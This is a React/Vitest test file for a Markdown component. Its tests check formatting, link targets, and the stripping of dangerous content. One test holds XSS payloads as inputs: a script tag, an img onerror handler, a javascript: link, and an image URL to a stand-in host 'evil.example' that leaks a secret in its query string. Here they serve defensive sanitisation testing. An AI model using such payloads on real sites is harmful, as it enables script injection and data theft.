import { render } from '@testing-library/react'
import { describe, expect, it } from 'vitest'
import { Markdown } from './Markdown'

describe('Markdown', () => {
  it('見出し、リスト、表、太字を整形する', () => {
    const { container } = render(
      <Markdown text={'### 見出し\n\n1. **一つ目**\n2. 二つ目\n\n| a | b |\n|---|---|\n| 1 | 2 |'} />,
    )
    expect(container.querySelector('h3')).toHaveTextContent('見出し')
    expect(container.querySelectorAll('ol li')).toHaveLength(2)
    expect(container.querySelector('strong')).toHaveTextContent('一つ目')
    expect(container.querySelector('table td')).toHaveTextContent('1')
  })

  it('HTML、危険なリンク、画像を表示しない', () => {
    const { container } = render(
      <Markdown
        text={
          '<script>alert(1)</script><img src=x onerror=alert(1)>\n\n' +
          '[a](javascript:alert(1)) ![追跡](https://evil.example/p.png?q=secret)'
        }
      />,
    )
    expect(container.querySelector('script')).toBeNull()
    expect(container.querySelector('img')).toBeNull()
    expect(container.querySelector('[onerror]')).toBeNull()
    const link = container.querySelector('a')
    expect(link?.getAttribute('href') ?? '').not.toContain('javascript:')
    // 画像の代わりに代替テキストだけを表示する
    expect(container).toHaveTextContent('追跡')
  })

  it('リンクは新しいタブで開く', () => {
    const { container } = render(<Markdown text="[求人](https://example.com/job)" />)
    const link = container.querySelector('a')
    expect(link).toHaveAttribute('target', '_blank')
    expect(link).toHaveAttribute('rel', 'noopener noreferrer')
  })
})
